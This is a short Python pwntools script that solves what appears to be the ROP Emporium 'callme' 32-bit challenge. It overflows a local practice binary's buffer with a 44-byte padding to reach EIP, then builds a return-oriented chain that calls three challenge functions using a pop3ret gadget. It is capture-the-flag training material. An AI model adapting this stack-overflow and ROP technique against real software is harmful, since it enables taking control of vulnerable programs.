#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

def create_chain(function):
    # -- callme_??? (1,2,3) --
    chain  = p32(function)   # callme_functions
    chain += p32(0x80488a9)  # pop3ret -> clean the stack
    chain += p32(0x1)
    chain += p32(0x2)
    chain += p32(0x3)
    return chain

def exploit():
    p = process('./callme32')

    payload = "A"*44                    # eip offset
    payload += create_chain(0x80485c0)  # callme_one
    payload += create_chain(0x8048620)  # callme_two
    payload += create_chain(0x80485b0)  # callme_three

    p.sendlineafter('> ', payload)
    print p.recvall()

if __name__ == '__main__':
    exploit()
#_EOF